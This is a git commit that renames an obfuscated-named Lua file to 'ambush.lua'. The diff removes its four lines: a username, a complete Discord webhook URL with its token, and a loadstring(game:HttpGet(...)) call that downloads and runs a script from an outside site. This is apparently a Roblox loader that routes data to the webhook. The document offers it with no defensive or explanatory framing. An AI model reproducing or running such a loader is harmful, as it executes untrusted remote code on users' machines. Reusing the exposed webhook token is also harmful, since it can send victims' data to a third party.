86651461f08a0588c41c48a0dea19241d22892af
zVladd <130866135+zVladd@users.noreply.github.com>
2023-04-16 15:57:48 +0300

    Update and rename obf_Y0AkMvGJ9KS83E2x4a9BsFfBh5Ju48PN33i2p6MQ8a5Qnntn9P84Hc2tN5x3IE3I.lua to ambush.lua

--- obf_Y0AkMvGJ9KS83E2x4a9BsFfBh5Ju48PN33i2p6MQ8a5Qnntn9P84Hc2tN5x3IE3I.lua
+++
@@ -1,4 +0,0 @@
-UserName = "zVladdd1"
-Webhook = "https://discord.com/api/webhooks/1097113168335089694/BnYVt7VwD0nBWnydTf7JhgNxWWC9iN5DTiTw31xDRmFoV1U9voV3lXt67NvyZFEFotdv"
-
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
